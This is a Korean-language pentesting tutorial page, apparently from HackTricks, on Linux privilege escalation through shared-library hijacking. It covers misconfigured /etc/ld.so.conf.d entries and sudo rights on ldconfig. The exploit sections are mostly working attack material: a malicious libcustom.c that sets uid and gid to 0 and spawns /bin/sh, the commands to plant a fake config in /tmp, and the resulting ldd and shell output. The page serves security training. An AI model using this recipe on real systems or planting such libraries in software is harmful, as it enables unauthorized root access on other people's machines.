# ld.so privesc exploit example

{{#include ../../banners/hacktricks-training.md}}

## 환경 준비

다음 섹션에서는 환경을 준비하는 데 사용할 파일의 코드를 찾을 수 있습니다.

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **파일**을 같은 폴더에 **생성**합니다.
2. **라이브러리**를 **컴파일**합니다: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. `libcustom.so`를 `/usr/lib`로 **복사**합니다: `sudo cp libcustom.so /usr/lib` (루트 권한)
4. **실행 파일**을 **컴파일**합니다: `gcc sharedvuln.c -o sharedvuln -lcustom`

### 환경 확인

_libcustom.so_가 _/usr/lib_에서 **로드**되고 있으며, 이진 파일을 **실행**할 수 있는지 확인합니다.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
## Exploit

이 시나리오에서는 **누군가가 _/etc/ld.so.conf/_ 파일 안에 취약한 항목을 생성했다고 가정합니다**:
```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```
취약한 폴더는 _/home/ubuntu/lib_입니다 (여기에서 쓰기 권한이 있습니다).\
**다음 코드를 다운로드하고** 해당 경로에서 컴파일하세요:
```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
setuid(0);
setgid(0);
printf("I'm the bad library\n");
system("/bin/sh",NULL,NULL);
}
```
이제 **잘못 구성된** 경로 안에 악성 libcustom 라이브러리를 **생성했으므로**, **재부팅**을 기다리거나 루트 사용자가 **`ldconfig`**를 실행하기를 기다려야 합니다 (_이 바이너리를 **sudo**로 실행할 수 있거나 **suid 비트**가 설정되어 있다면 직접 실행할 수 있습니다_).

이 일이 발생한 후 **다시 확인**하여 `sharevuln` 실행 파일이 `libcustom.so` 라이브러리를 어디에서 로드하는지 확인하십시오:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
보시다시피 **`/home/ubuntu/lib`에서 로드되고** 사용자가 이를 실행하면 셸이 실행됩니다:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!NOTE]
> 이 예제에서는 권한 상승을 하지 않았지만, 실행되는 명령을 수정하고 **루트 또는 다른 권한이 있는 사용자가 취약한 바이너리를 실행하기를 기다리면** 권한을 상승시킬 수 있습니다.

### 다른 잘못된 구성 - 동일한 취약점

이전 예제에서는 관리자가 **`/etc/ld.so.conf.d/` 내의 구성 파일 안에 비권한 폴더를 설정한** 잘못된 구성을 가장했습니다.\
하지만 동일한 취약점을 유발할 수 있는 다른 잘못된 구성도 있습니다. `/etc/ld.so.conf.d` 내의 일부 **구성 파일**에 **쓰기 권한**이 있거나, `/etc/ld.so.conf.d` 폴더 또는 `/etc/ld.so.conf` 파일에 쓰기 권한이 있으면 동일한 취약점을 구성하고 이를 악용할 수 있습니다.

## Exploit 2

**`ldconfig`에 대한 sudo 권한이 있다고 가정해 보겠습니다.**\
`ldconfig`에 **구성 파일을 어디서 로드할지** 지시할 수 있으므로, 이를 이용해 `ldconfig`가 임의의 폴더를 로드하도록 할 수 있습니다.\
따라서 "/tmp"를 로드하는 데 필요한 파일과 폴더를 생성해 보겠습니다:
```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
이제 **이전 익스플로잇에서 언급한 대로**, **`/tmp` 안에 악성 라이브러리를 생성합니다**.\
마지막으로, 경로를 로드하고 바이너리가 라이브러리를 어디에서 로드하는지 확인해 봅시다:
```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**보시다시피, `ldconfig`에 대한 sudo 권한이 있으면 동일한 취약점을 악용할 수 있습니다.**

{{#include ../../banners/hacktricks-training.md}}
